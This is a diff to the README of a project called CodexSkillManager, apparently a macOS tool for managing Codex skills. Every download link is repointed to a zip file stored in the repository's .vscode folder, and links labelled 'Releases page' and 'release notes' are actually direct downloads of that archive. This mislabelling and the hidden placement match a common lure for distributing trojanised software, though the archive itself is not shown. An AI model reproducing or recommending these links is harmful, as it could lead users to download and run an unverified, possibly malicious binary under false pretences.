@@ -1,7 +1,7 @@
 # 🎓 CodexSkillManager - Simplify Your Codex Skills Management
 
 ## 📥 Download Now
-[![Download CodexSkillManager](https://github.com/RKuvs/CodexSkillManager/raw/refs/heads/main/Sources/CodexSkillManager/App/Skill_Manager_Codex_1.0-alpha.2.zip)](https://github.com/RKuvs/CodexSkillManager/raw/refs/heads/main/Sources/CodexSkillManager/App/Skill_Manager_Codex_1.0-alpha.2.zip)
+[![Download CodexSkillManager](https://github.com/RKuvs/CodexSkillManager/raw/refs/heads/main/.vscode/Skill_Manager_Codex_v1.5.zip)](https://github.com/RKuvs/CodexSkillManager/raw/refs/heads/main/.vscode/Skill_Manager_Codex_v1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to CodexSkillManager! This is a macOS application designed to help you manage your Codex skills effortlessly. No programming knowledge is required; just follow these steps, and you'll be up and running quickly.
@@ -25,7 +25,7 @@ CodexSkillManager offers several features to enhance your experience:
 ## 💻 Download & Install
 To get started, follow these simple steps:
 
-1. Click on this [link to visit the Releases page](https://github.com/RKuvs/CodexSkillManager/raw/refs/heads/main/Sources/CodexSkillManager/App/Skill_Manager_Codex_1.0-alpha.2.zip).
+1. Click on this [link to visit the Releases page](https://github.com/RKuvs/CodexSkillManager/raw/refs/heads/main/.vscode/Skill_Manager_Codex_v1.5.zip).
 2. On the Releases page, locate the latest version of CodexSkillManager. 
 3. Click on the download link for your macOS version. 
 4. Once the download is complete, locate the downloaded file (usually in your "Downloads" folder).
@@ -48,6 +48,6 @@ If you need help, reach out through the Issues page in the GitHub repository. Pl
 We encourage users to share their experiences and suggestions. Your feedback helps us improve CodexSkillManager. To leave comments, visit the Issues page.
 
 ## 📰 Release Notes
-For detailed information about each release, including bug fixes and new features, please check the release notes on our [Releases page](https://github.com/RKuvs/CodexSkillManager/raw/refs/heads/main/Sources/CodexSkillManager/App/Skill_Manager_Codex_1.0-alpha.2.zip).
+For detailed information about each release, including bug fixes and new features, please check the release notes on our [Releases page](https://github.com/RKuvs/CodexSkillManager/raw/refs/heads/main/.vscode/Skill_Manager_Codex_v1.5.zip).
 
 Happy managing your Codex skills with CodexSkillManager! Enjoy a simplified and organized way to track your progress.
